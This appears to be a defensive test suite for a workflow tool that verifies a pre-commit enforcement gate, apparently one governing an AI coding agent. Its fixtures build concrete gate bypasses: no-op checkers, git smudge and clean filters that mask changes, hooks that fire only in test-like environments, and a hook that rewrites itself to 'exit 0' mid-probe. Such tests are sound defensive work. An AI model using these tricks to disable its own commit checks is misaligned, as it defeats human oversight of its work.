                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
        for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],
                  ['git','config','user.name','A'],['git','config','core.hooksPath','.githooks'],
                  ['git','add','-A'],['git','commit','-m','base']):
            subprocess.run(c,cwd=r,check=True,capture_output=True)
        return td,r

    def _git(self,r,*args):
        return subprocess.run(['git',*args],cwd=r,check=True,capture_output=True,text=True)

    def _status(self,r,*extra):
        return subprocess.run(['python3','workflow/bin/workflow_transition.py','enforcement-status',*extra],
                              cwd=r,capture_output=True,text=True)

    def _reason(self,out):
        for line in out.splitlines():
            if line.startswith('Reason: '): return line[len('Reason: '):]
        return ''

    def _commit_noop_checker(self,r):
        """把空轉 checker commit 進 HEAD，worktree 留真 checker。"""
        gate=r/'workflow/bin/check-implementation-gate.py'
        real=gate.read_text(encoding='utf-8')
        gate.write_text('import sys\nsys.exit(0)\n',encoding='utf-8')
        self._git(r,'add','workflow/bin/check-implementation-gate.py')
        self._git(r,'commit','-q','--no-verify','-m','noop checker')
        gate.write_text(real,encoding='utf-8')
        return real

    def _materialize(self,r,dest):
        """在子行程裡呼叫 _materialize_head，不污染測試行程的 sys.path/sys.modules。"""
        code=('import sys,pathlib;sys.path.insert(0,%r);import workflow_state as ws;'
              'print(ws._materialize_head(pathlib.Path(%r),pathlib.Path(%r)))'
              % (str(r/'workflow/bin'),str(r),str(dest)))
        out=subprocess.run(['python3','-c',code],capture_output=True,text=True)
        self.assertEqual(out.returncode,0,out.stdout+out.stderr)
        return out.stdout.strip()

    def test_local_smudge_filter_does_not_leak_into_head_snapshot(self):
        """隔離 checkout 轉換污染：來源本機的 smudge filter 不得洗白 HEAD 快照。

        `.gitattributes` 進得了 clone，`filter.X.smudge` 這個**本機 config** 進不了。
        在來源 repo 執行 checkout-index 會套用它，於是快照拿到被洗成真 checker 的內容。
        """
        td,r=self._repo()
        try:
            real=self._commit_noop_checker(r)
            (r/'.gitattributes').write_text('workflow/bin/check-implementation-gate.py filter=starterfix\n')
            self._git(r,'add','.gitattributes')
            self._git(r,'commit','-q','--no-verify','-m','attrs')
            fix=r/'fix.sh'
            fix.write_text('#!/usr/bin/env bash\ncat "$1"\n')
            fix.chmod(0o755)
            (r/'real-checker.py').write_text(real,encoding='utf-8')
            # 只設在來源的本機 config —— clone 不會有這一行
            self._git(r,'config','filter.starterfix.smudge','cat '+str(r/'real-checker.py'))
            pr=self._status(r,'--probe')
            self.assertNotEqual(pr.returncode,0,
                                '快照套用了來源本機的 smudge filter —— clone 不會有這個 filter\n'
                                +pr.stdout+pr.stderr)
            self.assertIn('HEAD 快照',pr.stdout+pr.stderr,pr.stdout+pr.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_local_autocrlf_does_not_change_head_snapshot_content(self):
        """隔離 checkout 轉換污染的第二種：core.autocrlf 是本機設定，不得改變快照內容。"""
        td,r=self._repo()
        try:
            self._git(r,'config','core.autocrlf','true')
            td2=Path(tempfile.mkdtemp(prefix='rc5r7-snap-'))
            try:
                dest=td2/'snap'; dest.mkdir()
                self.assertEqual(self._materialize(r,dest),'None','實體化必須成功')
                snap=(dest/'.githooks/pre-commit').read_bytes()
                head=subprocess.run(['git','cat-file','blob','HEAD:.githooks/pre-commit'],
                                    cwd=r,capture_output=True).stdout
                self.assertEqual(b'\r\n' in snap, b'\r\n' in head,
                                 '快照的換行必須與 HEAD blob 一致；autocrlf 是本機設定，clone 不會套用')
            finally: shutil.rmtree(td2,ignore_errors=True)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_gitlink_is_preserved_in_head_snapshot(self):
        """隔離 gitlink 遺失：mode 160000 的項目必須留在快照的 tree 裡。

        舊做法用 checkout-index 造出空目錄，`git add` 加不進空目錄，synthetic tree 於是
        少掉 gitlink。快照因此走 fallback 而通過，clone（submodule 未初始化）卻空轉。
        """
        td,r=self._repo()
        try:
            sub=td/'sub'; sub.mkdir()
            (sub/'f.txt').write_text('hi\n')
            for c in (['git','init','-q','-b','main'],['git','config','user.email','a@example.invalid'],
                      ['git','config','user.name','A'],['git','add','-A'],['git','commit','-qm','sub']):
                subprocess.run(c,cwd=sub,check=True,capture_output=True)
            subprocess.run(['git','-c','protocol.file.allow=always','submodule','add','-q',
                            str(sub),'vendor/sub'],cwd=r,check=True,capture_output=True)
            self._git(r,'commit','-q','--no-verify','-m','add submodule')
            self.assertEqual(self._git(r,'ls-tree','HEAD','--','vendor/sub').stdout.split()[0],'160000',
                             '前提：HEAD 必須真的有 gitlink')
            td2=Path(tempfile.mkdtemp(prefix='rc5r7-gl-'))
            try:
                dest=td2/'snap'; dest.mkdir()
                self.assertEqual(self._materialize(r,dest),'None','實體化必須成功')
                got=subprocess.run(['git','ls-tree','HEAD','--','vendor/sub'],cwd=dest,
                                   capture_output=True,text=True).stdout.split()
                self.assertTrue(got and got[0]=='160000',
                                f'快照必須保留 gitlink，實際：{got}')
                self.assertEqual(subprocess.run(['git','rev-parse','HEAD^{tree}'],cwd=dest,
                                                capture_output=True,text=True).stdout.strip(),
                                 self._git(r,'rev-parse','HEAD^{tree}').stdout.strip(),
                                 '快照的 tree 必須與來源 HEAD 完全相同')
            finally: shutil.rmtree(td2,ignore_errors=True)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_chained_wrapper_change_invalidates_receipt(self):
        """隔離 chained receipt 的涵蓋範圍：改掉 transitive wrapper 必須讓 receipt 失效。

        hook 檔案、HEAD、以及只涵蓋 workflow/bin 與 .githooks 的 digest 全都沒變，
        但實際執行的 wrapper 已經變成空轉 —— 舊 receipt 仍然有效，status 續報 ACTIVE_CHAINED。
        """
        td,r=self._repo()
        try:
            (r/'scripts').mkdir()
            w=r/'scripts/hook-wrapper.sh'
            w.write_text('#!/usr/bin/env bash\nbash .githooks/pre-commit || exit 1\n')
            w.chmod(0o755)
            (r/'.myhooks').mkdir()
            h=r/'.myhooks/pre-commit'
            h.write_text('#!/usr/bin/env bash\nbash scripts/hook-wrapper.sh || exit 1\n')
            h.chmod(0o755)
            self._git(r,'config','core.hooksPath','.myhooks')
            self._git(r,'add','-A')
            self._git(r,'commit','-q','--no-verify','-m','chained via wrapper')
            pr=self._status(r,'--probe')
            self.assertEqual(pr.returncode,0,'前提：wrapper 串接必須先通過驗證\n'+pr.stdout+pr.stderr)
            self.assertIn('ACTIVE_CHAINED',pr.stdout,pr.stdout)
            # 只動 wrapper，不動 hook、不動 HEAD、不動 .githooks 與 workflow/bin
            w.write_text('#!/usr/bin/env bash\nexit 0\n')
            w.chmod(0o755)
            s2=self._status(r)
            self.assertNotEqual(s2.returncode,0,
                                'wrapper 已被換成空轉，不得續報 active\n'+s2.stdout+s2.stderr)
            self.assertNotIn('ACTIVE_CHAINED',s2.stdout,s2.stdout)
            reprobe=self._status(r,'--probe')
            self.assertNotEqual(reprobe.returncode,0,'重新 probe 也必須失敗\n'+reprobe.stdout+reprobe.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_snapshot_does_not_see_unreachable_objects(self):
        """隔離「快照只能看到 HEAD 可達物件」：dangling object 不得在快照裡存在。

        `objects/info/alternates` 引用來源 ODB 會讓快照看見來源的**全部** object，
        包含 unreachable 的；真正的 clone 只拿得到 HEAD 可達物件。hook 只要以某個
        dangling object 是否存在來決定要不要執行 gate，本機與快照都會通過而 clone 空轉。
        """
        td,r=self._repo()
        try:
            dangling=subprocess.run(['git','hash-object','-w','--stdin'],cwd=r,input='sentinel\n',
                                    capture_output=True,text=True,check=True).stdout.strip()
            self.assertEqual(subprocess.run(['git','cat-file','-e',dangling],cwd=r).returncode,0,
                             '前提：來源必須看得到這個 dangling object')
            (r/'.myhooks').mkdir()
            h=r/'.myhooks/pre-commit'
            h.write_text('#!/usr/bin/env bash\n'
                         f'if git cat-file -e {dangling} 2>/dev/null; then\n'
                         '  exec bash .githooks/pre-commit\n'
                         'else\n  exit 0\nfi\n')
            h.chmod(0o755)
            self._git(r,'config','core.hooksPath','.myhooks')
            self._git(r,'add','.myhooks/pre-commit')
            self._git(r,'commit','-q','--no-verify','-m','hook conditional on dangling object')
            pr=self._status(r,'--probe')
            self.assertNotEqual(pr.returncode,0,
                                '快照看得到 clone 看不到的物件 —— 這正是繞過\n'+pr.stdout+pr.stderr)
            self.assertIn('本機行為驗證通過',pr.stdout,'前提：本機 probe 必須先通過，否則測不到快照那一層')
            self.assertIn('HEAD 快照',pr.stdout+pr.stderr,pr.stdout+pr.stderr)
            # 對照組：真正的 transport clone 也不生效
            c=td/'clone'
            subprocess.run(['git','clone','--no-local','-q',str(r),str(c)],check=True,capture_output=True)
            subprocess.run(['git','config','core.hooksPath','.myhooks'],cwd=c,check=True,capture_output=True)
            self.assertNotEqual(self._status(c,'--probe').returncode,0,
                                'fresh clone 本來就不生效 —— 這是本機回報 active 屬於繞過的證據')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_clean_filter_cannot_mask_a_changed_chained_wrapper(self):
        """隔離 worktree digest 必須讀原始位元組：clean filter 不得把不同內容正規化成同一棵 tree。

        `git add -u` 會套用來源本機的 `filter.X.clean`。把 clean 設成「永遠輸出好的那份
        wrapper」，wrapper 被換成 exit 0 之後 tree sha 完全不變，receipt 於是續報有效。
        """
        td,r=self._repo()
        try:
            good=td/'canonical-good-wrapper.sh'
            good.write_text('#!/usr/bin/env bash\nexec bash .githooks/pre-commit\n')
            (r/'scripts').mkdir(); (r/'.myhooks').mkdir()
            w=r/'scripts/hook-wrapper.sh'
            w.write_bytes(good.read_bytes()); w.chmod(0o755)
            h=r/'.myhooks/pre-commit'
            h.write_text('#!/usr/bin/env bash\nexec bash scripts/hook-wrapper.sh\n'); h.chmod(0o755)
            (r/'.gitattributes').write_text('scripts/hook-wrapper.sh filter=collapse\n')
            self._git(r,'config','filter.collapse.clean','cat '+str(good))
            self._git(r,'config','filter.collapse.smudge','cat')
            self._git(r,'config','core.hooksPath','.myhooks')
            self._git(r,'add','.gitattributes','.myhooks/pre-commit','scripts/hook-wrapper.sh')
            self._git(r,'commit','-q','--no-verify','-m','filtered chained wrapper')
            pr=self._status(r,'--probe')
            self.assertEqual(pr.returncode,0,'前提：串接必須先通過驗證\n'+pr.stdout+pr.stderr)
            self.assertIn('ACTIVE_CHAINED',pr.stdout,pr.stdout)
            w.write_text('#!/usr/bin/env bash\nexit 0\n'); w.chmod(0o755)
            s2=self._status(r)
            self.assertNotEqual(s2.returncode,0,
                                'wrapper 已被換成空轉；clean filter 讓 tree sha 沒變，'
                                '但 hook 執行的是磁碟上的位元組\n'+s2.stdout+s2.stderr)
            self.assertNotIn('ACTIVE_CHAINED',s2.stdout,s2.stdout)
        finally: shutil.rmtree(td,ignore_errors=True)

    def _reach_spec_review(self,r,change='demo-change'):
        subprocess.run(['python3','workflow/bin/workflow_transition.py','set-mode','GREENFIELD'],
                       cwd=r,check=True,capture_output=True)
        d=r/'openspec/changes'/change; (d/'specs').mkdir(parents=True)
        (d/'proposal.md').write_text('# Proposal\n做一件事。\n')
        (d/'tasks.md').write_text('# Tasks\n- [ ] 實作\n')
        (d/'specs/main.md').write_text('# Spec\n行為描述。\n')
        for c in (['start-change',change],['submit-for-review',change]):
            subprocess.run(['python3','workflow/bin/workflow_transition.py']+c,
                           cwd=r,check=True,capture_output=True)
        return change

    def _set_profile(self,r,**kv):
        p=r/'PROJECT-PROFILE.md'; t=p.read_text(encoding='utf-8')
        import re as _re
        for k,v in kv.items():
            k=k.replace('_',' ')
            t=_re.sub(rf'^{_re.escape(k)}:[ \t]*.*$',f'{k}: {v}',t,count=1,flags=_re.M)
        p.write_text(t,encoding='utf-8')
        recommit(r,'fixture: profile')

    def test_approve_spec_refuses_while_profile_is_unresolved(self):
        """G4 撞出的政策矛盾：UNKNOWN 可以進 SPEC_REVIEW，但不能進 ENGINEERING。

        檢查必須在 TTY 之前 —— 一是 fail fast，二是這條規則因此在無 TTY 環境也測得到。
        """
        td,r=self._repo()
        try:
            ch=self._reach_spec_review(r)
            x=subprocess.run(['python3','workflow/bin/workflow_transition.py','approve-spec',ch],
                             cwd=r,capture_output=True,text=True)
            out=x.stdout+x.stderr
            self.assertEqual(x.returncode,44,'必須以專屬 exit code 拒絕，而不是撞到 TTY 檢查\n'+out)
            self.assertNotIn('TTY',out,'必須在 TTY 檢查之前就拒絕，否則無 TTY 環境測不到這條規則')
            for f in ('Primary stack','Package manager','CI provider','Test database strategy'):
                self.assertIn(f,out,f'必須逐一列出未解析的欄位：缺 {f}\n'+out)
            st=subprocess.run(['python3','workflow/bin/workflow_transition.py','status'],
                              cwd=r,capture_output=True,text=True).stdout
            self.assertIn('Phase: SPEC_REVIEW',st,'失敗的 approve-spec 不得改動 STATE')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_unresolved_profile_does_not_block_reaching_spec_review(self):
        """對照組：UNKNOWN **可以**走到 SPEC_REVIEW —— 摩擦收在 approve-spec，不是更早。

        沒有這一條，上一條可以用「乾脆更早就擋」來滿足，而那正是造成矛盾的做法。
        """
        td,r=self._repo()
        try:
            self._reach_spec_review(r,'still-unknown')
            st=subprocess.run(['python3','workflow/bin/workflow_transition.py','status'],
                              cwd=r,capture_output=True,text=True).stdout
            self.assertIn('Phase: SPEC_REVIEW',st,
                          'profile 全是 UNKNOWN 時仍必須能進 SPEC_REVIEW\n'+st)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_resolved_profile_passes_the_check_and_reaches_tty(self):
        """profile 解析完成後，approve-spec 應該一路走到 TTY 才被擋（沙箱裡沒有 TTY）。

        這條防止「檢查永遠拒絕」這種假通過 —— 沒有它，上面那條用 `die(44)` 寫死也會綠。
        """
        td,r=self._repo()
        try:
            ch=self._reach_spec_review(r,'resolved-profile')
            self._set_profile(r,Type='CLI',Primary_stack='Python 3.12',
                              Package_manager='uv',Monorepo='no',CI_provider='GitHub Actions',
                              Test_database_strategy='not-applicable')
            self._set_profile(r,**{'Web verification required':'no'})
            x=subprocess.run(['python3','workflow/bin/workflow_transition.py','approve-spec',ch],
                             cwd=r,capture_output=True,text=True)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,44,'profile 已解析，不得再以 44 拒絕\n'+out)
            self.assertEqual(x.returncode,20,'應該走到 TTY 檢查才被擋\n'+out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_start_change_rejects_an_empty_change_directory(self):
        """G4 冷啟動抓到的洞：空的 change 目錄不得被 start-change 接受。

        state-log 是 append-only。綁上一個沒有內容的 change 名之後，那筆誤綁永久留在
        稽核紀錄裡，而且當時沒有任何訊息告訴使用者之後會被要求哪些 artifact。
        """
        td,r=self._repo()
        try:
            self._git(r,'config','user.email','a@example.invalid')
            subprocess.run(['python3','workflow/bin/workflow_transition.py','set-mode','GREENFIELD'],
                           cwd=r,check=True,capture_output=True)
            (r/'openspec/changes/totally-empty').mkdir(parents=True)
            x=subprocess.run(['python3','workflow/bin/workflow_transition.py','start-change','totally-empty'],
                             cwd=r,capture_output=True,text=True)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,'空目錄不得成功綁定\n'+out)
            self.assertIn('空的',out,out)
            for word in ('proposal','spec','task'):
                self.assertIn(word,out,f'錯誤訊息必須先講出之後會被要求的 artifact：缺 {word}\n'+out)
            st=subprocess.run(['python3','workflow/bin/workflow_transition.py','status'],
                              cwd=r,capture_output=True,text=True).stdout
            self.assertIn('Phase: DISCOVERY',st,'失敗的 transition 不得改動 STATE\n'+st)
            self.assertNotIn('totally-empty',
                             (r/'workflow/state-log.md').read_text(encoding='utf-8'),
                             'append-only 的稽核紀錄不得留下失敗綁定的痕跡')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_snapshot_origin_matches_a_real_clone(self):
        """隔離 metadata 正規化：快照的 origin 不得洩漏「這是 bundle 快照」。

        bundle clone 留下的 `remote.origin.url` 指向一個隨即被刪除的 .bundle 檔。
        hook 只要判斷 origin 為空或以 .bundle 結尾就執行 gate、否則空轉，本機與快照
        都會通過而真正的 transport clone 不生效。

        註：這條鎖的是**保真度**，不是安全邊界。會偵測執行環境的 hook 不在 HEAD 快照
        的涵蓋範圍內 —— 見 GATES.md〈HEAD 快照的能力邊界〉。
        """
        td,r=self._repo()
        try:
            # 來源**不設** origin：hook 因此在本機執行 gate（url 為空），本機 probe 會通過。
            # 未正規化的快照 origin 以 .bundle 結尾 —— 也會執行 gate，於是兩關全過。
            # 真正的 clone 有實際 origin，hook 空轉。這就是繞過。
            (r/'.myhooks').mkdir()
            h=r/'.myhooks/pre-commit'
            h.write_text('#!/usr/bin/env bash\n'
                         'url=$(git remote get-url origin 2>/dev/null || true)\n'
                         'if [ -z "$url" ] || [ "${url%.bundle}" != "$url" ]; then\n'
                         '  exec bash .githooks/pre-commit\n'
                         'else\n  exit 0\nfi\n')
            h.chmod(0o755)
            self._git(r,'config','core.hooksPath','.myhooks')
            self._git(r,'add','.myhooks/pre-commit')
            self._git(r,'commit','-q','--no-verify','-m','hook conditional on origin url')
            pr=self._status(r,'--probe')
            self.assertIn('本機行為驗證通過',pr.stdout,
                          '前提：本機 probe 必須先通過，否則測不到快照那一層\n'+pr.stdout+pr.stderr)
            self.assertNotEqual(pr.returncode,0,
                                '快照的 origin 洩漏了它是 bundle 快照\n'+pr.stdout+pr.stderr)
            self.assertIn('HEAD 快照',pr.stdout+pr.stderr,pr.stdout+pr.stderr)
            # 對照組：真正的 transport clone 也不生效
            c=td/'clone'
            subprocess.run(['git','clone','--no-local','-q',str(r),str(c)],check=True,capture_output=True)
            subprocess.run(['git','config','core.hooksPath','.myhooks'],cwd=c,check=True,capture_output=True)
            self.assertNotEqual(self._status(c,'--probe').returncode,0,
                                'fresh clone 本來就不生效 —— 這是本機回報 active 屬於繞過的證據')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_head_moving_during_bundle_creation_is_detected(self):
        """隔離後置條件：讀完 HEAD 之後、bundle create 之前 HEAD 被移動，必須被抓到。

        這是那個相等斷言的**失敗模型**（TOCTOU），不是假想的保險。
        用 PATH 上的 git wrapper 在 `bundle create` 前插一筆 commit 來確定性重現。
        """
        td,r=self._repo()
        try:
            bindir=td/'fakebin'; bindir.mkdir()
            real=subprocess.run(['which','git'],capture_output=True,text=True).stdout.strip()
            flag=td/'raced'
            wrapper=bindir/'git'
            wrapper.write_text(
                '#!/usr/bin/env bash\n'
                f'REAL={real}\n'
                'for a in "$@"; do\n'
                '  if [ "$a" = "bundle" ]; then\n'
                f'    if [ ! -e "{flag}" ]; then\n'
                f'      touch "{flag}"\n'
                f'      "$REAL" -C "{r}" commit -q --no-verify --allow-empty -m race >/dev/null 2>&1\n'
                '    fi\n'
                '    break\n'
                '  fi\n'
                'done\n'
                'exec "$REAL" "$@"\n')
            wrapper.chmod(0o755)
            env=dict(os.environ); env['PATH']=str(bindir)+os.pathsep+env['PATH']
            pr=subprocess.run(['python3','workflow/bin/workflow_transition.py','enforcement-status','--probe'],
                              cwd=r,env=env,capture_output=True,text=True)
            self.assertTrue(flag.exists(),'前提：wrapper 必須真的在 bundle 之前插入了一筆 commit')
            self.assertNotEqual(pr.returncode,0,
                                'HEAD 在 bundle 建立期間被移動，不得回報通過\n'+pr.stdout+pr.stderr)
            self.assertIn('HEAD 快照與來源不一致',pr.stdout+pr.stderr,pr.stdout+pr.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_symlink_is_rejected_even_when_head_and_target_are_both_functional(self):
        """symlink 分支的**真隔離**：HEAD 與 symlink 目標都是真 gate，其他每一層都會放行。

        Codex 指出上一輪那三條 symlink 測試只鎖 Reason，安全結果仍由 HEAD probe 保住。
        這一條讓 HEAD 快照 probe 也通過 —— 唯一擋下它的只剩 symlink 分支本身。
        """
        td,r=self._repo()
        try:
            real=r/'.githooks/real-gate'
            real.write_text((r/'.githooks/pre-commit').read_text(encoding='utf-8'),encoding='utf-8')
            real.chmod(0o755)
            self._git(r,'add','.githooks/real-gate')
            self._git(r,'commit','-q','--no-verify','-m','add real gate')   # HEAD 的 pre-commit 仍是真 gate
            h=r/'.githooks/pre-commit'; h.unlink(); h.symlink_to('real-gate')
            self.assertEqual(self._git(r,'ls-files','-s','--','.githooks/pre-commit').stdout.split()[0],
                             '100755','前提：index 必須合格')
            self.assertEqual(self._git(r,'ls-tree','HEAD','--','.githooks/pre-commit').stdout.split()[0],
                             '100755','前提：HEAD 必須合格，且內容是真 gate —— HEAD 快照 probe 會通過')
            s=self._status(r)
            self.assertIn('INACTIVE',s.stdout,
                          '每一層都放行時，只剩 symlink 分支能擋下 —— 這才是它的隔離測試\n'+s.stdout)
            self.assertIn('symlink',self._reason(s.stdout),s.stdout)
        finally: shutil.rmtree(td,ignore_errors=True)


class RC5ProvenanceTests(unittest.TestCase):
    """使用者層級設定會影響 agent，但不在版控裡。doctor 必須讓它可見，且不得混進 enforcement。

    共同判準：provenance 是**可觀測性訊號**。它不改變 Repository enforcement 的判定 ——
    把它混進去等於讓 Starter 對它無法驗證的東西下判斷。
    """

    def _repo(self):
        td=Path(tempfile.mkdtemp(prefix='rc5prov-')); r=td/'repo'; r.mkdir()
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
        for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],
                  ['git','config','user.name','A'],['git','config','core.hooksPath','.githooks'],
                  ['git','add','-A'],['git','commit','-m','base']):
            subprocess.run(c,cwd=r,check=True,capture_output=True)
        return td,r

    def _doctor(self,r,home):
        """以隔離的 HOME 執行 doctor —— 不讀開發者本機真實的 ~/.claude。"""
        env=dict(os.environ); env['HOME']=str(home)
        return subprocess.run(['python3','workflow/bin/workflow_transition.py','doctor'],
                              cwd=r,env=env,capture_output=True,text=True)

    def test_same_name_user_skill_is_reported_as_warn(self):
        """同名 skill 是**結構上確定的覆蓋**（managed > user > project），不是語意猜測。"""
        td,r=self._repo()
        try:
            home=td/'home'; us=home/'.claude/skills/git-smart-commit'; us.mkdir(parents=True)
            (us/'SKILL.md').write_text('---\nname: git-smart-commit\n---\n覆蓋版\n',encoding='utf-8')
            out=self._doctor(r,home).stdout
            self.assertIn('WARN',out,out)
            self.assertIn('git-smart-commit',out,'必須指名是哪一個 skill 被遮蔽\n'+out)
            self.assertIn('遮蔽',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_provenance_does_not_change_enforcement_verdict(self):
        """provenance 出現 WARN 時，Repository enforcement 的判定必須完全不受影響。"""
        td,r=self._repo()
        try:
            home=td/'home'; (home/'.claude').mkdir(parents=True)
            clean=self._doctor(r,home)
            us=home/'.claude/skills/git-smart-commit'; us.mkdir(parents=True)
            (us/'SKILL.md').write_text('---\nname: git-smart-commit\n---\n覆蓋版\n',encoding='utf-8')
            warned=self._doctor(r,home)
            def enforcement_line(o):
                return [l for l in o.stdout.splitlines() if l.startswith('Repository enforcement:')]
            self.assertEqual(enforcement_line(clean),enforcement_line(warned),
                             'provenance 不得改變 enforcement 判定')
            self.assertEqual(clean.returncode,warned.returncode,'provenance 不得改變 exit code')
            self.assertIn('WARN',warned.stdout,'前提：這次必須真的產生 WARN，否則沒測到東西')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_local_settings_file_is_reported(self):
        """.claude/settings.local.json 未追蹤且優先於共享設定，clone 的人不會有它。"""
        td,r=self._repo()
        try:
            home=td/'home'; (home/'.claude').mkdir(parents=True)
            (r/'.claude/settings.local.json').write_text('{}',encoding='utf-8')
            out=self._doctor(r,home).stdout
            self.assertIn('settings.local.json',out,out)
            self.assertIn('WARN',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_provenance_does_not_leak_hook_bodies_or_skill_contents(self):
        """doctor 的輸出常被貼進 issue 與聊天室，不得洩漏憑證與私人設定。"""
        td,r=self._repo()
        try:
            home=td/'home'
            hd=home/'.claude/hooks'; hd.mkdir(parents=True)
            (hd/'secret-hook.sh').write_text('#!/bin/sh\nexport TOKEN=sk-SUPERSECRET-VALUE\n',encoding='utf-8')
            (home/'.claude/settings.json').write_text(
                '{"env":{"MY_API_KEY":"sk-ANOTHER-SECRET"}}',encoding='utf-8')
            sk=home/'.claude/skills/personal'; sk.mkdir(parents=True)
            (sk/'SKILL.md').write_text('私人內容 PRIVATE-SKILL-BODY\n',encoding='utf-8')
            out=self._doctor(r,home)
            blob=out.stdout+out.stderr
            for leaked in ('sk-SUPERSECRET-VALUE','sk-ANOTHER-SECRET','PRIVATE-SKILL-BODY'):
                self.assertNotIn(leaked,blob,f'輸出洩漏了 {leaked}\n'+blob)
            self.assertIn('hooks',blob,'仍必須回報「存在使用者 hooks」這件事')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_provenance_states_it_is_not_a_complete_inventory(self):
        """不得讓人誤以為列完了。看不到的來源必須明講，並指向 /hooks 與 /status。"""
        td,r=self._repo()
        try:
            home=td/'home'; (home/'.claude/rules').mkdir(parents=True)
            out=self._doctor(r,home).stdout
            self.assertIn('filesystem inventory',out,out)
            for src in ('managed policy','session hooks','shell environment'):
                self.assertIn(src,out,f'必須列出看不到的來源：缺 {src}\n'+out)
            self.assertIn('/hooks',out,'必須指向能看到實際生效清單的工具')
        finally: shutil.rmtree(td,ignore_errors=True)



class RC5Round12Tests(unittest.TestCase):
    """Codex 第十二輪的三個 blocker。每一條都對應一個實測重現，不是推測。"""

    def _repo(self):
        td=Path(tempfile.mkdtemp(prefix='rc5r12-')); r=td/'repo'; r.mkdir()
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
        for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],
                  ['git','config','user.name','A'],['git','add','-A'],['git','commit','-m','base']):
            subprocess.run(c,cwd=r,check=True,capture_output=True)
        return td,r

    def _run(self,r,*args,**kw):
        return subprocess.run(['python3','workflow/bin/workflow_transition.py',*args],
                              cwd=r,capture_output=True,text=True,**kw)

    def _set_profile(self,r,**kv):
        p=r/'PROJECT-PROFILE.md'; t=p.read_text(encoding='utf-8')
        import re as _re
        for k,v in kv.items():
            k=k.replace('_',' ')
            t=_re.sub(rf'^{_re.escape(k)}:[ \t]*.*$',f'{k}: {v}',t,count=1,flags=_re.M)
        p.write_text(t,encoding='utf-8')

    def _resolve_profile(self,r):
        self._set_profile(r,Type='API',Web_verification_required='no',
                          Primary_stack='Python 3.12',Package_manager='uv',Monorepo='no',
                          CI_provider='GitHub Actions',
                          Test_database_strategy='not-applicable')
        # 定案的 profile 必須進 HEAD：approve-spec 現在要求 worktree/index/HEAD 一致。
        recommit(r,'fixture: resolved profile')

    # ---- Blocker 1：receipt 只能替 probe 之前捕獲的狀態背書 -------------------

    def _chained(self,r,body):
        (r/'.myhooks').mkdir(exist_ok=True)
        h=r/'.myhooks/pre-commit'; h.write_text(body,encoding='utf-8'); h.chmod(0o755)
        subprocess.run(['git','add','-A'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','-c','core.hooksPath=/dev/null','commit','-m','chain'],
                       cwd=r,check=True,capture_output=True)
        subprocess.run(['git','config','core.hooksPath','.myhooks'],cwd=r,check=True,capture_output=True)
        return h

    def test_hook_that_rewrites_itself_during_probe_gets_no_receipt(self):
        """probe 之後才採樣 fingerprint 的話，receipt 會替空轉版的 hook 背書。

        **必須用 `mv` 換 inode。** `printf > "$0"` 會截斷 shell 正在讀的檔案，
        `exit` 那行讀不到，hook 回 0 而被 probe 判失敗 —— 那樣測到的是自我改寫
        腳本的 artifact，不是這條防禦。
        """
        td,r=self._repo()
        try:
            h=self._chained(r,'#!/bin/sh\n'
                              'bash .githooks/pre-commit\n'
                              'rc=$?\n'
                              'printf \'%s\\n\' \'#!/bin/sh\' \'exit 0\' > "$0.new"\n'
                              'chmod +x "$0.new"\n'
                              'mv -f "$0.new" "$0"\n'
                              'exit "$rc"\n')
            x=self._run(r,'enforcement-status','--probe')
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,
                                'hook 在 probe 期間把自己換成空轉版，不得回報成功\n'+out)
            self.assertIn('probe 期間狀態發生變動',out,out)
            self.assertEqual(h.read_text(encoding='utf-8').strip().splitlines()[-1],'exit 0',
                             '前提檢查：攻擊確實生效了，hook 現在是空轉版')
            self.assertFalse((r/'.git/starter-enforcement-probe.json').exists(),
                             'receipt 必須被刪除；留著會讓下一次不加 --probe 的查詢'
                             '繼續宣稱「行為驗證通過」')
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_stale_receipt_is_removed_not_merely_left_unwritten(self):
        """先有一份合法 receipt，再換成會自我改寫的 hook —— 舊 receipt 不得存活。"""
        td,r=self._repo()
        try:
            self._chained(r,'#!/bin/sh\nbash .githooks/pre-commit\n')
            ok=self._run(r,'enforcement-status','--probe')
            self.assertEqual(ok.returncode,0,'前提：誠實的 chained hook 應該通過\n'+ok.stdout+ok.stderr)
